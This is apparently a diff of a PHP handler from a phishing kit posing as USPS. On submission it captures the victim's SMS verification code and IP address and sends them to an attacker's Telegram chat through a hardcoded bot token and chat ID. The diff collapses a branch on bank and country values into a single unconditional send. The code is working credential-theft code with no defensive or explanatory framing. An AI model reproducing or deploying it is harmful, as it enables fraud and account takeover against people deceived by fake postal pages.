@@ -32,19 +32,8 @@ if(isset($_POST['okbbx'])){
 $ip = getenv("REMOTE_ADDR");
     $message =   $_SESSION["msg"] ;
 $message .= "-------------------- <3 USPS <3-------------------\nSMS Code  : ".$_POST['sms1']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
+sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
     $_SESSION["msg"] = $message ;
-    $bn=   $_SESSION['bn'];
-    $cn=   $_SESSION['cn'];
-	if (strpos($bn, 'WELLS') !== false) {
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
-    else if(strpos($cn, 'CANADA') !== false)
-    {
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
-    else{
-        sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
-    }
 
 HEADER("Location: index7.php");
 }
